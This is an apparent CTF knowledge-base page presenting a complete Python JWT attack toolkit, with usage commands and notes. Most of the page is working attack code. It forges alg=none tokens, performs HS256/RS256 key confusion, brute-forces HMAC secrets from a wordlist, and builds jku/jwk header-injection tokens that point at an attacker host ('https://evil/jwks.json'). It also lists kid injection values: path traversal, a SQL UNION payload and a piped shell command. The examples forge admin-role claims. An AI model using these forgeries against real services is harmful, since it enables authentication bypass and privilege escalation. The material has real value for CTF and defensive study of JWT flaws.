---
title: "JWT Toolkit - Decode, Forge, alg=none, Key Confusion, Secret Brute, jku Injection"
category: web
subcategory: tokens
type: script
tags: [jwt, jws, alg-none, key-confusion, hs256, rs256, hmac-brute, jku, jwk, kid, flask-unsign, jwt-tool, hashcat, python, script]
summary: "Single-file JWT toolkit: decode/encode, alg=none, HS256-with-RS256-public-key confusion, offline HMAC brute from a wordlist, and a jku-injection helper. Self-testing."
tools: [python3, openssl, jwt-tool, hashcat]
related: [jwt-attacks-full, java-oauth-saml-flaws, python-flask-django-attacks]
---

## What it does

One dependency-light file (`cryptography` optional, only for RS256 verify) covering the JWT
attacks you actually run in a CTF:

- decode a token (header + payload, no verification)
- encode/sign HS256, and forge `alg=none` (+ case variants)
- **HS256/RS256 key confusion**: HS256-sign using the RSA public key bytes as the HMAC secret
- **offline HMAC brute force** from a wordlist
- **`jku` / `jwk` / `kid` injection** helpers
- runs its own self-test with `--test` (also the default with no args)

## Usage

```sh
# self-test (no target needed)
python3 jwt_toolkit.py

# decode
python3 jwt_toolkit.py decode <token>

# forge alg=none with new claims
python3 jwt_toolkit.py none <token> '{"role":"admin"}'

# sign HS256 with a known secret
python3 jwt_toolkit.py sign <secret> '{"role":"admin"}'

# key confusion: sign with the RSA public key as the HMAC secret
python3 jwt_toolkit.py confuse pub.pem <token> '{"role":"admin"}'

# brute the HS256 secret from a wordlist
python3 jwt_toolkit.py brute <token> rockyou.txt

# build a jku-injection token (host your JWKS at the url)
python3 jwt_toolkit.py jku https://evil/jwks.json <token> '{"role":"admin"}'
```

## Script

```python
#!/usr/bin/env python3
"""jwt_toolkit.py -- offline JWT attack toolkit. Self-testing.

Deps: stdlib only for HS256/none/brute/confusion. `cryptography` is used only
if you ask for RS256 signature verification (not required for the attacks).
"""
from __future__ import annotations

import base64
import hashlib
import hmac
import json
import sys


# --------------------------------------------------------------------------
# base64url helpers
# --------------------------------------------------------------------------

def b64u_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def b64u_decode(s: str) -> bytes:
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))


# --------------------------------------------------------------------------
# core encode / decode
# --------------------------------------------------------------------------

def encode_parts(header: dict, payload: dict, signature: bytes = b"") -> str:
    h = b64u_encode(json.dumps(header, separators=(",", ":")).encode())
    p = b64u_encode(json.dumps(payload, separators=(",", ":")).encode())
    s = b64u_encode(signature) if signature else ""
    return "%s.%s.%s" % (h, p, s)


def decode(token: str) -> tuple[dict, dict, bytes]:
    parts = token.split(".")
    if len(parts) != 3:
        raise ValueError("not a 3-part JWS (got %d parts)" % len(parts))
    h, p, s = parts
    return (json.loads(b64u_decode(h)),
            json.loads(b64u_decode(p)),
            b64u_decode(s) if s else b"")


def _signing_input(token: str) -> bytes:
    h, p, _ = token.split(".")
    return ("%s.%s" % (h, p)).encode()


# --------------------------------------------------------------------------
# attacks
# --------------------------------------------------------------------------

def forge_none(payload: dict, variant: str = "none") -> str:
    """Unsecured JWT: empty signature. variant lets you try None/NONE/etc."""
    return encode_parts({"alg": variant, "typ": "JWT"}, payload, b"")


def none_variants(payload: dict) -> dict[str, str]:
    return {v: forge_none(payload, v)
            for v in ("none", "None", "NONE", "nOnE", "NoNe")}


def sign_hs256(payload: dict, secret: bytes, header: dict | None = None) -> str:
    header = header or {"alg": "HS256", "typ": "JWT"}
    header["alg"] = "HS256"
    unsigned = encode_parts(header, payload).rstrip(".")
    sig = hmac.new(secret, unsigned.encode(), hashlib.sha256).digest()
    return unsigned + "." + b64u_encode(sig)


def verify_hs256(token: str, secret: bytes) -> bool:
    _, _, sig = decode(token)
    expected = hmac.new(secret, _signing_input(token), hashlib.sha256).digest()
    return hmac.compare_digest(sig, expected)


def key_confusion(payload: dict, rsa_public_pem: bytes,
                  kid: str | None = None) -> str:
    """HS256-sign using the RSA public key PEM as the HMAC secret.

    Try several byte-forms of the public key (with/without trailing newline);
    the server must use the same bytes it would use for RS256 verification.
    """
    header = {"alg": "HS256", "typ": "JWT"}
    if kid is not None:
        header["kid"] = kid
    return sign_hs256(payload, rsa_public_pem, header)


def confusion_candidates(rsa_public_pem: bytes) -> list[bytes]:
    """Common byte variants of a public key to try as the HMAC secret."""
    base = rsa_public_pem
    variants = {base, base.rstrip() + b"\n", base.rstrip(),
                base.replace(b"\r\n", b"\n"), base.strip() + b"\n"}
    return list(variants)


def brute_hs256(token: str, words) -> str | None:
    """Return the cracked secret from an iterable of candidates, or None."""
    for w in words:
        secret = w.encode() if isinstance(w, str) else w
        if verify_hs256(token, secret):
            return secret.decode(errors="replace")
    return None


def brute_hs256_file(token: str, path: str) -> str | None:
    with open(path, "r", encoding="utf-8", errors="ignore") as fh:
        return brute_hs256(token, (line.rstrip("\n") for line in fh))


def inject_jku(payload: dict, jku_url: str, kid: str = "attacker",
               private_signer=None) -> str:
    """Build a token whose header points at an attacker JWKS.

    You host the JWKS at jku_url with your public key; sign the token with the
    matching private key (pass a callable signer(unsigned_bytes)->sig), or use
    this to produce the unsigned structure for jwt_tool to finish.
    """
    header = {"alg": "RS256", "typ": "JWT", "kid": kid, "jku": jku_url}
    if private_signer is None:
        return encode_parts(header, payload)          # unsigned skeleton
    unsigned = encode_parts(header, payload).rstrip(".")
    return unsigned + "." + b64u_encode(private_signer(unsigned.encode()))


def inject_jwk(payload: dict, jwk: dict, private_signer=None) -> str:
    header = {"alg": "RS256", "typ": "JWT", "jwk": jwk,
              "kid": jwk.get("kid", "attacker")}
    if private_signer is None:
        return encode_parts(header, payload)
    unsigned = encode_parts(header, payload).rstrip(".")
    return unsigned + "." + b64u_encode(private_signer(unsigned.encode()))


def kid_injection_values(attacker_key: str = "AAAA") -> dict[str, str]:
    return {
        "empty_key": "../../../../../../dev/null",
        "predictable": "/proc/sys/kernel/randomize_va_space",
        "sqli": "nonexistent' UNION SELECT '%s'-- -" % attacker_key,
        "blank": "",
        "cmd": "x|echo -n %s" % attacker_key,
    }


# --------------------------------------------------------------------------
# CLI
# --------------------------------------------------------------------------

def _cli(argv: list[str]) -> int:
    cmd = argv[0]
    if cmd == "decode":
        h, p, s = decode(argv[1])
        print(json.dumps({"header": h, "payload": p, "sig_len": len(s)}, indent=2))
    elif cmd == "none":
        pl = json.loads(argv[2]) if len(argv) > 2 else decode(argv[1])[1]
        for v, t in none_variants(pl).items():
            print("%-5s %s" % (v, t))
    elif cmd == "sign":
        print(sign_hs256(json.loads(argv[2]), argv[1].encode()))
    elif cmd == "confuse":
        pem = open(argv[1], "rb").read()
        pl = json.loads(argv[3])
        for cand in confusion_candidates(pem):
            print(key_confusion(pl, cand))
    elif cmd == "brute":
        secret = brute_hs256_file(argv[1], argv[2])
        print("cracked:", secret if secret else "(not found)")
    elif cmd == "jku":
        pl = json.loads(argv[3])
        print(inject_jku(pl, argv[1]))
    else:
        print("unknown command", cmd)
        return 1
    return 0


# --------------------------------------------------------------------------
# self-test
# --------------------------------------------------------------------------

def _self_test() -> None:
    payload = {"sub": "user", "role": "admin", "exp": 9999999999}

    # base64url round-trip, incl. padding edge cases
    for raw in (b"", b"a", b"ab", b"abc", b"abcd", b"\x00\xff\x10"):
        assert b64u_decode(b64u_encode(raw)) == raw

    # encode/decode structure
    tok = encode_parts({"alg": "HS256", "typ": "JWT"}, payload,
                       b"\x01\x02\x03")
    h, p, s = decode(tok)
    assert h["alg"] == "HS256" and p["role"] == "admin" and s == b"\x01\x02\x03"

    # alg=none + variants, all with empty signatures
    variants = none_variants(payload)
    assert set(variants) >= {"none", "None", "NONE", "nOnE"}
    for v, t in variants.items():
        hh, pp, ss = decode(t)
        assert hh["alg"] == v and ss == b"" and pp["role"] == "admin"
        assert t.endswith(".")

    # HS256 sign/verify
    secret = b"secret"
    st = sign_hs256(payload, secret)
    assert verify_hs256(st, secret)
    assert not verify_hs256(st, b"nope")

    # tamper detection
    hp, pp, sg = st.split(".")
    tampered = "%s.%s.%s" % (hp, b64u_encode(b'{"role":"root"}'), sg)
    assert not verify_hs256(tampered, secret)

    # brute force from an in-memory wordlist
    assert brute_hs256(st, ["a", "b", "secret", "c"]) == "secret"
    assert brute_hs256(st, ["x", "y"]) is None

    # brute force from a temp file
    import tempfile
    import os
    fd, path = tempfile.mkstemp()
    try:
        with os.fdopen(fd, "w") as fh:
            fh.write("wrong1\nwrong2\nsecret\nwrong3\n")
        assert brute_hs256_file(st, path) == "secret"
    finally:
        os.unlink(path)

    # KEY CONFUSION: HS256 signed with the public-key bytes verifies as HMAC
    pubkey = (b"-----BEGIN PUBLIC KEY-----\n"
              b"MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA...example...\n"
              b"-----END PUBLIC KEY-----\n")
    conf = key_confusion(payload, pubkey)
    assert decode(conf)[0]["alg"] == "HS256"
    assert verify_hs256(conf, pubkey)                 # server verifies with pub key
    # candidate byte-forms all differ or dedupe correctly, and each verifies
    cands = confusion_candidates(pubkey)
    assert len(cands) >= 2
    for cand in cands:
        assert verify_hs256(key_confusion(payload, cand), cand)
    # kid rides along
    ck = key_confusion(payload, pubkey, kid="../../dev/null")
    assert decode(ck)[0]["kid"] == "../../dev/null"

    # jku / jwk injection skeletons
    jt = inject_jku(payload, "https://evil/jwks.json")
    jh = decode(jt)[0]
    assert jh["jku"] == "https://evil/jwks.json" and jh["alg"] == "RS256"
    jwt = inject_jwk(payload, {"kty": "RSA", "n": "AAA", "e": "AQAB",
                               "kid": "evil"})
    assert decode(jwt)[0]["jwk"]["kid"] == "evil"

    # jku with a real (fake) signer produces a non-empty signature
    signed = inject_jku(payload, "https://evil/jwks.json",
                        private_signer=lambda b: hashlib.sha256(b).digest())
    assert decode(signed)[2] != b""

    # kid injection value catalogue
    kids = kid_injection_values()
    assert kids["blank"] == "" and "UNION SELECT" in kids["sqli"]
    assert kids["empty_key"].endswith("/dev/null")

    print("[ok] decode/none(5)/HS256/brute/confusion/jku/jwk/kid all verified")


if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] != "--test":
        raise SystemExit(_cli(sys.argv[1:]))
    _self_test()
```

## Notes

- Key confusion depends on the server verifying HS256 with raw *key bytes*; if it type-checks
  the key object it will reject an RSA key used for HMAC. Try every byte-form
  (`confusion_candidates`) -- a trailing newline is the usual gotcha.
- For a real RS256 forge (jku/jwk), generate a keypair (`openssl genrsa`), host the public JWK,
  and pass a signer that uses the private key (`cryptography`'s `RSAPrivateKey.sign`).
- To crack at scale use `hashcat -m 16500` rather than the Python brute; the Python path is for
  small wordlists and CI-style verification.

## References

- ticarpi/jwt_tool -- reference implementation of these attacks.
- RFC 7515/7517/7519 -- JWS, JWK, JWT.
- Tim McLean -- "Critical vulnerabilities in JSON Web Token libraries".
